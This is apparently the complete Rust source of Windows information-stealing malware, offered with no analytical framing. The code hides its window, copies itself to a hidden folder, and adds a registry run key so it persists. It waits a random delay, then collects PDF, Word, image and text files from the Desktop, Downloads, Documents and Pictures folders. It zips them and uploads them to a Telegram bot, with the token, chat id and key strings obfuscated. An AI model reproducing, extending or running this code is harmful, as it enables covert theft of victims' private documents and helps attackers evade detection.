#![windows_subsystem = "windows"]

mod obfuscation;

use std::fs::{self};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use zip::ZipWriter;
use zip::write::FileOptions;
use dirs::{desktop_dir, document_dir, picture_dir, download_dir};
use tokio;
use rand::Rng;
use tokio::time::{sleep, Duration};
use std::process::Command;
use std::env;

#[cfg(windows)]
use winreg::enums::*;
#[cfg(windows)]
use winreg::RegKey;

const MAX_SIZE_PDF: u64 = 10 * 1024 * 1024;
const MAX_SIZE_DOC: u64 = 10 * 1024 * 1024;
const MAX_SIZE_DOCX: u64 = 10 * 1024 * 1024;
const MAX_SIZE_IMAGES: u64 = 5 * 1024 * 1024;
const MAX_SIZE_TXT: u64 = 3 * 1024 * 1024;
const MAX_ZIP_SIZE: u64 = 45 * 1024 * 1024;

#[derive(Clone)]
struct FileInfo {
    path: PathBuf,
    relative_path: String,
}

mod utils {
    use super::*;

    pub async fn a2d5h7k1() {
        let v_a1b2 = rand::thread_rng().gen_range(1000..5000);
        sleep(Duration::from_millis(v_a1b2)).await;
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let v_c3d4 = env::current_exe()?;
    
    let v_e5f6 = env::var(&obfuscation::deobfuscate("UlMwRUQzQyswLTEzIE4ySzA=").unwrap())
        .unwrap_or_else(|_| obfuscation::deobfuscate("UyQyRTYxNy80RUY2M1I2KjcyKzg0").unwrap());
    let v_g7h8 = Path::new(&v_e5f6).join(obfuscation::deobfuscate("V0MwWEw3V0Y3OCA0UVY0UFE2OTM2LjM2S0s0QyU2").unwrap());
    let v_i9j0 = v_g7h8.join(obfuscation::deobfuscate("LyA0UCU2IEY3TEE0MzQ2MzE=").unwrap());
    
    if v_c3d4 == v_i9j0 {
        return b4g8l2p6().await;
    }
    
    let v_k1l2 = c5i9m3q7(&v_i9j0)?;
    
    if !v_k1l2 {
        if let Err(_) = d6j0n4r8(&v_i9j0) {
        }
        
        if let Err(_) = e7k1o5s9(&v_i9j0) {
        }
    }
    
    f8l2p6t0(&v_i9j0)?;
    
    Ok(())
}

async fn b4g8l2p6() -> Result<(), Box<dyn std::error::Error>> {
    let v_m3n4 = k3q7u1y5()?;

    if v_m3n4.is_empty() {
        return Ok(());
    }

    let v_o5p6 = m5s9w3a7(&v_m3n4)?;

    for (i, v_q7r8) in v_o5p6.iter().enumerate() {
        let v_s9t0 = format!("{}_{}.zip", &obfuscation::deobfuscate("TSU2T0E3QzQ2IDg0Ojg2TEw2RkE3SSA0VFY0Ui40").unwrap(), i + 1);

        utils::a2d5h7k1().await;
        match n6t0x4b8(v_q7r8, &v_s9t0).await {
            Ok(_) => {},
            Err(_) => {},
        }
    }

    Ok(())
}

#[cfg(windows)]
fn c5i9m3q7(v_i9j0: &Path) -> Result<bool, Box<dyn std::error::Error>> {
    let v_u1v2 = v_i9j0.exists();
    
    let mut v_w3x4 = false;
    
    let v_y5z6 = RegKey::predef(HKEY_CURRENT_USER);
    match v_y5z6.open_subkey_with_flags(
        &obfuscation::deobfuscate("V1kwNUkyJEIwOCswWDYxT1I3Ny80TCQ0Kks2QjYxVFI3MkE2Q0U0VjYxLTI0Li40SEw3NkkwVy40U1I3JUs3TyswRTE=")?,
        KEY_READ
    ) {
        Ok(v_a1b2) => {
            match v_a1b2.get_value::<String, _>(&obfuscation::deobfuscate("V0MwWEw3V0Y3OCA0UVY0UFE2OTM2LjM2S0s0QyU2")?) {
                Ok(v_c3d4) => {
                    let v_e5f6 = v_i9j0.to_string_lossy();
                    if v_c3d4 == v_e5f6 {
                        v_w3x4 = true;
                    }
                },
                Err(_) => {}
            }
        },
        Err(_) => {}
    }
    
    Ok(v_u1v2 && v_w3x4)
}

#[cfg(not(windows))]
fn c5i9m3q7(_v_i9j0: &Path) -> Result<bool, Box<dyn std::error::Error>> {
    Ok(false)
}

fn d6j0n4r8(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let v_g7h8 = v_i9j0.parent().unwrap();

    if !v_g7h8.exists() {
        fs::create_dir_all(&v_g7h8)?;
        let hidden_folder_path_str = v_g7h8.to_string_lossy().to_string();
        Command::new(&obfuscation::deobfuscate("UFE2Ujg0UFI3")?)
            .args([&obfuscation::deobfuscate("Ny9G")?, &hidden_folder_path_str])
            .output()?;
    }
    let v_k1l2 = env::current_exe()?;
    fs::copy(&v_k1l2, v_i9j0)?;
    let target_exe_str = v_i9j0.to_string_lossy().to_string();
    Command::new(&obfuscation::deobfuscate("UFE2Ujg0UFI3")?)
        .args([&obfuscation::deobfuscate("Ny9G")?, &target_exe_str])
        .output()?;
    
    Ok(())
}

#[cfg(windows)]
fn e7k1o5s9(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let v_m3n4 = RegKey::predef(HKEY_CURRENT_USER);
    let v_o5p6 = v_m3n4.open_subkey_with_flags(
        &obfuscation::deobfuscate("V1kwNUkyJEIwOCswWDYxT1I3Ny80TCQ0Kks2QjYxVFI3MkE2Q0U0VjYxLTI0Li40SEw3NkkwVy40U1I3JUs3TyswRTE=")?,
        KEY_WRITE
    )?;
    
    let v_q7r8 = &obfuscation::deobfuscate("V0MwWEw3V0Y3OCA0UVY0UFE2OTM2LjM2S0s0QyU2")?;
    let v_s9t0 = v_i9j0.to_string_lossy();
    
    v_o5p6.set_value(v_q7r8, &v_s9t0.to_string())?;
    
    Ok(())
}

#[cfg(not(windows))]
fn e7k1o5s9(_v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

fn f8l2p6t0(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
    if v_i9j0.exists() {
        Command::new(v_i9j0)
            .spawn()
            .ok();
    }
    
    std::process::exit(0);
}

fn g9m3q7u1(v_a1b2: &str) -> u64 {
    match v_a1b2.to_lowercase().as_str() {
        "pdf" => MAX_SIZE_PDF,
        "doc" => MAX_SIZE_DOC,
        "docx" => MAX_SIZE_DOCX,
        "png" | "jpeg" | "jpg" => MAX_SIZE_IMAGES,
        "txt" => MAX_SIZE_TXT,
        _ => 0,
    }
}

fn h0n4r8v2(v_c3d4: &Path) -> bool {
    if let Some(v_e5f6) = v_c3d4.extension() {
        let v_g7h8 = v_e5f6.to_string_lossy().to_lowercase();
        matches!(v_g7h8.as_str(), "pdf" | "doc" | "docx" | "png" | "jpeg" | "jpg" | "txt")
    } else {
        false
    }
}

fn i1o5s9w3(v_i9j0: &Path) -> bool {
    if let Some(v_k1l2) = v_i9j0.extension() {
        let v_m3n4 = v_k1l2.to_string_lossy().to_lowercase();
        let v_o5p6 = g9m3q7u1(&v_m3n4);

        if v_o5p6 == 0 {
            return false;
        }

        match fs::metadata(v_i9j0) {
            Ok(v_q7r8) => v_q7r8.len() <= v_o5p6,
            Err(_) => false,
        }
    } else {
        false
    }
}

fn j2p6t0x4(v_s9t0: &Path, v_u1v2: &str) -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
    let mut v_w3x4 = Vec::new();

    if !v_s9t0.exists() {
        return Ok(v_w3x4);
    }

    fn v_y5z6(
        v_a1b2: &Path,
        v_c3d4: &str,
        v_e5f6: &str,
        v_g7h8: &mut Vec<FileInfo>
    ) -> Result<(), Box<dyn std::error::Error>> {
        let v_i9j0 = match fs::read_dir(v_a1b2) {
            Ok(v_i9j0) => v_i9j0,
            Err(_) => return Ok(()),
        };

        for v_k1l2 in v_i9j0 {
            let v_k1l2 = match v_k1l2 {
                Ok(v_k1l2) => v_k1l2,
                Err(_) => continue,
            };

            let v_m3n4 = v_k1l2.path();

            if v_m3n4.is_file() {
                if h0n4r8v2(&v_m3n4) && i1o5s9w3(&v_m3n4) {
                    let v_o5p6 = if v_e5f6.is_empty() {
                        format!("{}/{}", v_c3d4, v_m3n4.file_name().unwrap().to_string_lossy())
                    } else {
                        format!("{}/{}/{}", v_c3d4, v_e5f6, v_m3n4.file_name().unwrap().to_string_lossy())
                    };
                    v_g7h8.push(FileInfo { path: v_m3n4, relative_path: v_o5p6 });
                }
            } else if v_m3n4.is_dir() {
                let v_q7r8 = match v_m3n4.file_name() {
                    Some(name) => name.to_string_lossy(),
                    None => continue,
                };

                let v_s9t0 = if v_e5f6.is_empty() {
                    v_q7r8.to_string()
                } else {
                    format!("{}/{}", v_e5f6, v_q7r8)
                };
                if v_y5z6(&v_m3n4, v_c3d4, &v_s9t0, v_g7h8).is_err() {
                    continue;
                }
            }
        }
        Ok(())
    }

    v_y5z6(v_s9t0, v_u1v2, "", &mut v_w3x4)?;
    Ok(v_w3x4)
}

fn k3q7u1y5() -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
    let mut v_a1b2 = Vec::new();

    if let Some(v_c3d4) = desktop_dir() {
        if let Ok(mut v_e5f6) = j2p6t0x4(&v_c3d4, &obfuscation::deobfuscate("WjcyUCQ0MTk0JDA=").unwrap()) {
            v_a1b2.append(&mut v_e5f6);
        }
    }

    if let Some(v_g7h8) = download_dir() {
        if let Ok(mut v_i9j0) = j2p6t0x4(&v_g7h8, &obfuscation::deobfuscate("MDgyWEU0UEE3LVE2JTA=").unwrap()) {
            v_a1b2.append(&mut v_i9j0);
        }
    }

    if let Some(v_k1l2) = document_dir() {
        if let Ok(mut v_m3n4) = j2p6t0x4(&v_k1l2, &obfuscation::deobfuscate("MDgyLSQ2VDQ3SEw3JTA=").unwrap()) {
            v_a1b2.append(&mut v_m3n4);
        }
    }

    if let Some(v_o5p6) = picture_dir() {
        if let Ok(mut v_q7r8) = j2p6t0x4(&v_o5p6, &obfuscation::deobfuscate("WlQwLiQ2LTI0LTM2").unwrap()) {
            v_a1b2.append(&mut v_q7r8);
        }
    }

    Ok(v_a1b2)
}

fn l4r8v2z6(v_s9t0: &[FileInfo]) -> Result<Vec<Vec<FileInfo>>, Box<dyn std::error::Error>> {
    let mut v_u1v2 = Vec::new();
    let mut v_w3x4 = Vec::new();
    let mut v_y5z6 = 0;

    for v_a1b2 in v_s9t0 {
        let v_c3d4 = match fs::metadata(&v_a1b2.path) {
            Ok(v_c3d4) => v_c3d4.len(),
            Err(_) => continue,
        };

        if v_c3d4 > MAX_ZIP_SIZE {
            continue;
        }

        if v_y5z6 + v_c3d4 > MAX_ZIP_SIZE && !v_w3x4.is_empty() {
            v_u1v2.push(v_w3x4);
            v_w3x4 = Vec::new();
            v_y5z6 = 0;
        }

        v_w3x4.push(v_a1b2.clone());
        v_y5z6 += v_c3d4;
    }

    if !v_w3x4.is_empty() {
        v_u1v2.push(v_w3x4);
    }

    Ok(v_u1v2)
}

fn m5s9w3a7(v_e5f6: &[FileInfo]) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
    let v_g7h8 = l4r8v2z6(v_e5f6)?;
    let mut v_i9j0 = Vec::new();

    for v_k1l2 in v_g7h8.iter() {
        let mut v_m3n4 = Vec::new();
        {
            let mut v_o5p6 = ZipWriter::new(std::io::Cursor::new(&mut v_m3n4));

            let v_q7r8 = FileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);

            for v_s9t0 in v_k1l2 {
                if v_o5p6.start_file(v_s9t0.relative_path.clone(), v_q7r8).is_ok() {
                    if let Ok(mut v_u1v2) = std::fs::File::open(&v_s9t0.path) {
                        let mut v_w3x4 = Vec::new();
                        if v_u1v2.read_to_end(&mut v_w3x4).is_ok() {
                            let _ = v_o5p6.write_all(&v_w3x4);
                        }
                    }
                }
            }

            v_o5p6.finish()?;
        }

        v_i9j0.push(v_m3n4);
    }

    Ok(v_i9j0)
}

async fn n6t0x4b8(v_y5z6: &[u8], v_a1b2: &str) -> Result<(), Box<dyn std::error::Error>> {
    let v_c3d4 = obfuscation::deobfuscate("LUpDS1BDRyREVUpDQyRELTFFOU8yTyAzSS0yMlZDUCtDWE8zUDczNS8yV1VET1VEN1AwOC82OlMxNERDUzk2NC0wTUw3")?;
    let v_e5f6 = obfuscation::deobfuscate("IEpDLUpDMUVDLUpDSDhD")?;

    let v_g7h8 = format!("https://api.telegram.org/bot{}/{}", v_c3d4, obfuscation::deobfuscate("QiQ0WEw3MDgyLSQ2VDQ3SEw3")?);

    let v_i9j0 = reqwest::Client::new();

    let chat_id_str = obfuscation::deobfuscate("UCU2UFE2QUQxNDE=")?;
    let document_str = obfuscation::deobfuscate("MkE2LSQ2VDQ3SEw3")?;
    let mime_str = &obfuscation::deobfuscate("VFE2WVY0T1I3UFE2U1I3R043Vy81JDA=")?;

    let v_k1l2 = reqwest::multipart::Form::new()
        .text(chat_id_str, v_e5f6)
        .part(document_str,
            reqwest::multipart::Part::bytes(v_y5z6.to_vec())
                .file_name(v_a1b2.to_string())
                .mime_str(mime_str)?
        );

    let v_m3n4 = v_i9j0.post(&v_g7h8)
        .multipart(v_k1l2)
        .send()
        .await?;

    if !v_m3n4.status().is_success() {
        let v_o5p6 = v_m3n4.text().await?;
        return Err(v_o5p6.into());
    }

    Ok(())
}
